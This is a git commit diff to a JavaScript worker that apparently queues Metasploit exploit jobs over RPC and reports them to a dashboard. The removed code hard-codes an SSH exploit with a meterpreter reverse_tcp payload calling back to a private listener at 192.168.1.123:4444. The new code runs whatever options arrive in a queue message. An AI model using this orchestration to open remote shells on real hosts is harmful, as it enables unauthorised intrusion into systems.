9c6e5e284e247c0271fab21948ea0a45a24069d0
Brian Johnson <brian.l.johnson@gmail.com>
2020-02-05 21:24:47 -0600

    update metasploitworker to actually use the options passed to it

--- scanner/MetasploitWorker.js
+++ scanner/MetasploitWorker.js
@@ -39,7 +39,7 @@ async function main() {
             msgJSON = JSON.parse(msg.content.toString());
             console.log(msgJSON);
 
-            let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', {"RHOSTS": "192.168.1.42", "USERNAME": "bj", "PASSWORD": process.env.SSH_PASS, "PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "LHOST": "192.168.1.123", "LPORT": "4444"});
+            let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', msg.content.toString());
             console.log(job);
             
             axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
@@ -115,77 +115,6 @@ async function main() {
     catch(error) {
         console.error(error);
     }
-
-    /*
-    let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', {"RHOSTS": "192.168.1.42", "USERNAME": "bj", "PASSWORD": process.env.SSH_PASS, "PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "LHOST": "192.168.1.123", "LPORT": "4444"});
-    console.log(job);
-    
-    axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
-    .then(function(resp) {
-        console.log(resp.status);
-    })
-    .catch(function(error) {
-        console.log("in catch, trying to login'");
-        let loginReq = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
-            "email": process.env.DASHBOARD_USER,
-            'password': process.env.DASHBOARD_PASS
-        })
-        loginReq
-        .then(function(response) {
-            console.log(response.status);
-            console.log("login successful");
-        })
-        .catch(function(error) {
-            console.log("logi failed");
-            process.exit(1);
-        });
-
-        return loginReq
-    })
-    .then(function() {
-        console.log("about to post job");
-        axios.post(process.env.DASHBOARD_URL+'/exploit', {
-            ip: "192.168.1.42",
-            port: 22,
-            exploit: "multi/ssh/login",
-            jobID: job.uuid
-        })
-        .then(function(resp) {
-            console.log(resp.data);
-
-        });
-    })
-
-    let running = true;
-    while(running) {
-        let jobList = await msfrpc.job.list();
-        for (j in jobList) {
-            console.log(j);
-            running = false;
-            if(j === job.job_id) {
-                running = true;
-            }
-        }
-
-        let promise = new Promise((resolve, reject) => {
-            setTimeout(() => resolve("done!"), 1000)
-          });
-        
-        let result = await promise; // wait until the promise resolves (*)
-    }
-    console.log("job done!");
-
-
-   let promise = new Promise((resolve, reject) => {
-    setTimeout(() => resolve("done!"), 2000)
-   });
-
-    let result = await promise; // wait until the promise resolves (*)
-
-    let sessionList = await msfrpc.session.list();
-    console.log(sessionList);
-   */
-
 
 }
 
